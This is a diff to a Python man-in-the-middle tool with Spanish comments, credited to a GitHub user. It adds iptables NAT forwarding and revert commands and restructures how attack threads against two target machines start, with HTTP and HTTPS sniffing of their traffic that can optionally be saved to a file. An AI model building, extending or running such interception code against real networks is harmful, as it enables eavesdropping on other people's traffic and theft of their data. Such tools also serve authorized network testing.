@@ -19,10 +19,10 @@ init()
  
 logo = '''
 \033[0;40;35m
- ▗▄▄▖ ▗▄▖ ▗▄▄▖ ▗▖ ▗▖▗▄▄▄▖ ▗▄▄▖ ▗▄▖ 
-▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌
- ▝▀▚▖▐▛▀▜▌▐▛▀▚▖▐▌ ▐▌▐▛▀▀▘ ▝▀▚▖▐▌ ▐▌
-▗▄▄▞▘▐▌ ▐▌▐▙▄▞▘▝▚▄▞▘▐▙▄▄▖▗▄▄▞▘▝▚▄▞▘
+       ▗▄▄▖ ▗▄▖ ▗▄▄▖ ▗▖ ▗▖▗▄▄▄▖ ▗▄▄▖ ▗▄▖ 
+      ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌
+       ▝▀▚▖▐▛▀▜▌▐▛▀▚▖▐▌ ▐▌▐▛▀▀▘ ▝▀▚▖▐▌ ▐▌
+      ▗▄▄▞▘▐▌ ▐▌▐▙▄▞▘▝▚▄▞▘▐▙▄▄▖▗▄▄▞▘▝▚▄▞▘
  
  
 \033[0;40;31m[+] por Urb@n --> https://github.com/Urban20                                      
@@ -45,8 +45,9 @@ def salir(señal, frame):
    print('\n\n\033[0;32msaliendo de la herramienta...\033[0m\n\n')
 
    #revierte las cofiguraciones del sistema
-   ejecutar_comandos(revertir=True)
-   
+   if parametros.param.sniff != None:
+      ejecutar_comandos(revertir=True)
+
    ejecutando = False
    sys.exit(0)
    
@@ -113,15 +114,21 @@ def sniffing_HTTPS():
  
 def ejecutar_comandos(revertir:bool):
    if revertir:
+      if subprocess.run(['iptables','-t','nat','-F']).returncode != 0:
+         print('hubo un problema al revertir comando de iptables')
+      else: print('comando iptables revertido con exito\n')
       sr = '1'
       ip_f = '0'
       ipt = 'D'
-   else:
+   else: 
+      if subprocess.run(['iptables','-t','nat','-A','POSTROUTING','-o',parametros.param.interfaz,'-j','MASQUERADE']).returncode != 0:
+         print('hubo un problema al ejecutar comando de iptables')
+      else: print('comando iptables ejecutado con exito\n')
       sr = '0'
       ip_f = '1'
       ipt = 'A'
 
-   'funcion que ejecuta los comandos que se necesitan para el mitm'
+   'funcion que ejecuta los comandos que se necesitan para el mitm + sniffing'
    # ejecuta comandos de linux de iptables cuyo propositos son la redireccion de
    # paquetes al router
    # ademas incremeto los ttl para evitar que el paquete muera antes de llegar correctamente al router
@@ -137,14 +144,24 @@ def ejecutar_comandos(revertir:bool):
 
  
 def ejecucion(maq1,maq2):
- 
-   threading.Thread(target=ataque,args=(maq1,maq2)).start()
+
    if parametros.param.sniff:
+      # modo mitm + sniffing
+      if parametros.param.interfaz is None:
+         print('[!] especificar el argumento -i /--interfaz\n')
+         sys.exit(0)
+
+      threading.Thread(target=ataque,args=(maq1,maq2)).start()
       ejecutar_comandos(revertir=False)
       print(Fore.GREEN + "se habilita el sniffing de los sistemas objetivos\n" + Fore.RESET)
       threading.Thread(target=sniffing_HTTPS).start()
       threading.Thread(target=sniffing_HTTP).start()
-   else: print(Fore.GREEN + "solo estamos atacando con mitm\n" + Fore.RESET)
+
+      # modo solo mitm
+   else: 
+      threading.Thread(target=ataque,args=(maq1,maq2)).start()
+
+      print(Fore.GREEN + "solo estamos atacando con mitm\n" + Fore.RESET)
  
  
 if __name__ == '__main__':
@@ -167,14 +184,14 @@ if __name__ == '__main__':
                print("\nagrega el parametro -h para ver los comandos\n")
                sys.exit(0)
 
-            preg = str(input('[0] para guardar info de paquetes HTTPS en .txt >> ')).strip()
-
             ipv4s.append(maq1)
             ipv4s.append(maq2)
+            if parametros.param.sniff != None:
+               preg = str(input('[0] para guardar info de paquetes HTTPS en .txt >> ')).strip()
 
-            if preg == '0':
-               guardado = True
-               n_arch = str(input('[#] nombre que tendra el archivo >> ')).strip()
+               if preg == '0':
+                  guardado = True
+                  n_arch = str(input('[#] nombre que tendra el archivo >> ')).strip()
             else:
                n_arch = None
 
